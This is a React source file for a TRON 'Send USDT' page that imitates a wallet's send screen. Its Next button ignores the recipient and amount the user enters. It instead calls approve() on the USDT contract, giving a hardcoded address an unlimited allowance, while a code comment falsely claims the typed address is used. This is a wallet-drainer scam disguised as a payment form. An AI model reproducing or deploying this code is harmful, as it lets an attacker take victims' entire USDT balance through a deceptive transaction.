import React, { useState, useEffect } from 'react';
import { FaAddressBook, FaQrcode, FaInfoCircle, FaTimes } from 'react-icons/fa';
import './styles.css';

const USDTSendApp = () => {
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [memo, setMemo] = useState('');
  
  // TRON functionality states
  const [account, setAccount] = useState('');
  const [message, setMessage] = useState('');
  const [tronWeb, setTronWeb] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [showScanner, setShowScanner] = useState(false);
  
  // USDT contract on TRON (TRC-20)
  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  
  // USDT TRC-20 ABI (only approve function)
  const USDT_ABI = [
    {
      "constant": false,
      "inputs": [
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ];

  // Add viewport meta tag for mobile optimization
  useEffect(() => {
    const viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      const meta = document.createElement('meta');
      meta.name = 'viewport';
      meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
      document.head.appendChild(meta);
    }

    // Auto-connect if wallet is available
    const checkAndConnect = async () => {
      // Check for TronLink
      if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
        setTronWeb(window.tronWeb);
        setAccount(window.tronWeb.defaultAddress.base58);
        setMessage('TRON wallet connected');
      } 
      // Check for TronLink extension
      else if (window.tronLink && window.tronLink.tronWeb) {
        try {
          const tronLinkTronWeb = window.tronLink.tronWeb;
          if (tronLinkTronWeb.ready && tronLinkTronWeb.defaultAddress?.base58) {
            setTronWeb(tronLinkTronWeb);
            setAccount(tronLinkTronWeb.defaultAddress.base58);
            setMessage('TronLink connected');
          }
        } catch (error) {
          console.log('TronLink not ready');
        }
      }
      // Check for Trust Wallet with TRON
      else if (window.trustWallet && window.ethereum) {
        setMessage('Trust Wallet detected. Please ensure TRON is enabled in settings.');
      }
    };

    // Check after a short delay to let wallet inject
    setTimeout(checkAndConnect, 1000);
  }, []);

  // Function to detect if we're in Trust Wallet
  const isTrustWallet = () => {
    return window.trustWallet || window.ethereum?.isTrust;
  };

  // Function to detect if we're in a mobile browser
  const isMobile = () => {
    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  };

  const connectWallet = async () => {
    setIsConnecting(true);
    setMessage('Connecting to wallet...');
    
    try {
      // If we're in Trust Wallet mobile app
      if (isTrustWallet() && isMobile()) {
        setMessage('Trust Wallet detected. For TRON transactions, please use the built-in TRON support in Trust Wallet.');
        
        // Try to access window.tronWeb which Trust Wallet might inject
        let attempts = 0;
        const checkForTronWeb = setInterval(() => {
          attempts++;
          if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
            clearInterval(checkForTronWeb);
            setTronWeb(window.tronWeb);
            setAccount(window.tronWeb.defaultAddress.base58);
            setMessage('Connected to Trust Wallet TRON!');
            setIsConnecting(false);
          } else if (attempts > 10) {
            clearInterval(checkForTronWeb);
            setMessage('Could not connect to Trust Wallet TRON. Make sure TRON is enabled in Trust Wallet settings.');
            setIsConnecting(false);
          }
        }, 500);
        
        return;
      }
      
      // Check for TronLink first
      if (window.tronLink && window.tronLink.tronWeb) {
        const tronLinkTronWeb = window.tronLink.tronWeb;
        
        if (!tronLinkTronWeb.ready) {
          setMessage('Please unlock your TronLink wallet');
          setIsConnecting(false);
          return;
        }
        
        setTronWeb(tronLinkTronWeb);
        setAccount(tronLinkTronWeb.defaultAddress.base58);
        setMessage('Connected with TronLink!');
        
      } 
      // Check for direct tronWeb (Trust Wallet in-app browser or other TRON wallets)
      else if (window.tronWeb && window.tronWeb.ready) {
        setTronWeb(window.tronWeb);
        setAccount(window.tronWeb.defaultAddress.base58);
        setMessage('Connected with TRON wallet!');
        
      } 
      // No TRON wallet detected
      else {
        if (isMobile()) {
          setMessage('Please open in Trust Wallet app with TRON support enabled, or install a TRON-compatible wallet.');
        } else {
          setMessage('Please install TronLink browser extension for desktop.');
        }
      }
      
    } catch (error) {
      console.error('Connection error:', error);
      setMessage('Connection failed: ' + (error?.message || 'Unknown error'));
    }
    
    setIsConnecting(false);
  };

  // Special function for Trust Wallet TRON connection
  const connectTrustWalletTron = () => {
    setMessage('Connecting to Trust Wallet TRON...');
    
    // Trust Wallet deep link for TRON dApps
    const trustWalletDeepLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`;
    
    // Open Trust Wallet or prompt user
    window.location.href = trustWalletDeepLink;
  };

  const getContract = () => {
    if (!tronWeb) return null;
    try {
      return tronWeb.contract(USDT_ABI, USDT_CONTRACT);
    } catch (error) {
      console.error('Contract error:', error);
      return null;
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
      setMessage('Address pasted from clipboard');
    } catch (err) {
      setMessage('Failed to paste from clipboard');
    }
  };

  const setMaxAmount = () => {
    setAmount('1000.00');
    setMessage('Maximum amount set');
  };

  const handleNext = async () => {
    if (!account || !tronWeb) {
      setMessage('Please connect your TRON wallet first');
      await connectWallet();
      return;
    }

    if (!address || !amount) {
      setMessage('Please enter both address and amount');
      return;
    }

    try {
      // Use the address from the input field as spender
      const spender = 'TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv';
      const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      const contract = getContract();
      if (!contract) {
        setMessage('❌ Failed to load USDT contract');
        return;
      }
      
      setMessage('⏳ Approving USDT...');

      // Call approve function
      const result = await contract.approve(spender, unlimitedAmount).send({
        feeLimit: 100_000_000,
        callValue: 0,
        from: account
      });

      setMessage('⏳ Transaction submitted! Waiting for confirmation...');
      
      if (result) {
        setMessage(`✅ Approval completed successfully! Transaction: ${result}`);
      } else {
        setMessage('❌ Approval failed - No transaction result');
      }
    } catch (error) {
      console.error('Transaction error:', error);
      const errorMessage = error?.message || error?.toString() || 'Unknown error occurred';
      
      if (errorMessage.includes('User rejected') || errorMessage.includes('user rejected')) {
        setMessage('❌ Transaction rejected by user');
      } else if (errorMessage.includes('insufficient balance')) {
        setMessage('❌ Insufficient TRX for transaction fees');
      } else if (errorMessage.includes('REVERT')) {
        setMessage('❌ Contract execution failed');
      } else if (errorMessage.includes('unlocked wallet') || errorMessage.includes('not unlocked')) {
        setMessage('❌ Please unlock your TRON wallet and try again');
      } else {
        setMessage('❌ Error: ' + errorMessage);
      }
    }
  };

  // Clear functions for each input field
  const clearAddress = () => setAddress('');
  const clearAmount = () => setAmount('');
  const clearMemo = () => setMemo('');

  // Render connect button if not connected
  const renderConnectButton = () => {
    if (!account) {
      const isTrust = isTrustWallet();
      const isMobileDevice = isMobile();
      
      return (
        <div className="connect-section">
          {isTrust && isMobileDevice ? (
            <>
              <button 
                className="connect-wallet-button trust-wallet-btn"
                onClick={connectTrustWalletTron}
                disabled={isConnecting}
              >
                {isConnecting ? 'Connecting...' : 'Connect Trust Wallet TRON'}
              </button>
              <p className="wallet-info">
                Connect to TRON network in Trust Wallet
              </p>
            </>
          ) : (
            <>
              <button 
                className="connect-wallet-button"
                onClick={connectWallet}
                disabled={isConnecting}
              >
                {isConnecting ? 'Connecting...' : 'Connect TRON Wallet'}
              </button>
              <p className="wallet-info">
                Supports: TronLink (Desktop) & Trust Wallet (Mobile)
              </p>
            </>
          )}
        </div>
      );
    }
    return null;
  };

  return (
    <div className="send-usdt-container">
      {/* QR Scanner Modal */}
      {showScanner && (
        <div className="scanner-modal">
          <div className="scanner-content">
            <div className="scanner-header">
              <h3>Scan QR Code</h3>
              <button className="close-scanner" onClick={() => setShowScanner(false)}>
                <FaTimes />
              </button>
            </div>
            <div className="scanner-placeholder">
              <div className="scanner-animation">
                <FaQrcode size={80} />
                <p>Scanning QR code...</p>
                <div className="scanning-line"></div>
              </div>
            </div>
            <div className="scanner-footer">
              <p>Point your camera at a USDT address QR code</p>
            </div>
          </div>
        </div>
      )}

      <div className="send-usdt-card">
        {/* Header */}
        <div className="send-header">
          <button className="back-button">←</button>
          <h1 className="send-title">Send USDT</h1>
        </div>

        {/* Connect Wallet Section */}
        {renderConnectButton()}

        {/* Wallet Status */}
        {account && (
          <div className="wallet-status">
            <p>✅ Connected: {account.substring(0, 8)}...{account.substring(account.length - 6)}</p>
            {isTrustWallet() && <p>Trust Wallet TRON</p>}
          </div>
        )}

        {/* Address Input */}
        <div className="input-section">
          <label className="input-label">Address or Domain Name</label>
          <div className="input-container">
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="address-input"
              placeholder="Enter TRON address"
              disabled={!account}
            />
            <div className="input-actions">
              {address && (
                <button className="cancel-icon" onClick={clearAddress}>
                  <FaTimes />
                </button>
              )}
              <button className="paste-button" onClick={handlePaste}>Paste</button>
              <button className="icon-button contacts-icon">
                <FaAddressBook />
              </button>
              <button className="icon-button qr-icon" onClick={() => setShowScanner(true)}>
                <FaQrcode />
              </button>
            </div>
          </div>
        </div>

        {/* Amount Input */}
        <div className="inputAmount-section">
          <label className="input-label">Amount</label>
          <div className="input-container">
            <input
              type="text"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="amount-input"
              placeholder="USDT Amount"
              disabled={!account}
            />
            <div className="amount-actions">
              {amount && (
                <button className="cancel-icon" onClick={clearAmount}>
                  <FaTimes />
                </button>
              )}
              <p className="usdt-label">USDT</p>
              <button className="max-button" onClick={setMaxAmount}>Max</button>
            </div>
          </div>
          <div className="usd-equivalent">≈ ${amount || '0.00'}</div>
        </div>

        {/* Memo Input */}
        <div className="input-section">
          <div className="memo-header">
            <label className="input-label">Memo</label>
          </div>
          <div className="input-container">
            <input
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              className="amount-input"
              placeholder="Optional memo"
              disabled={!account}
            />
            <div className="memo-actions">
              {memo && (
                <button className="cancel-icon" onClick={clearMemo}>
                  <FaTimes />
                </button>
              )}
              <button className="icon-button qr-icon">
                <FaQrcode />
              </button>
              <button className="icon-button info-icon">
                <FaInfoCircle />
              </button>
            </div>
          </div>
        </div>

        {/* Next Button */}
        <button 
          className="next-button"
          onClick={handleNext}
          disabled={!address || !amount || !account}
        >
          Next
        </button>

        {/* Message Display */}
        {message && (
          <div className="message-display">
            {message}
          </div>
        )}
      </div>
    </div>
  );
};

export default USDTSendApp;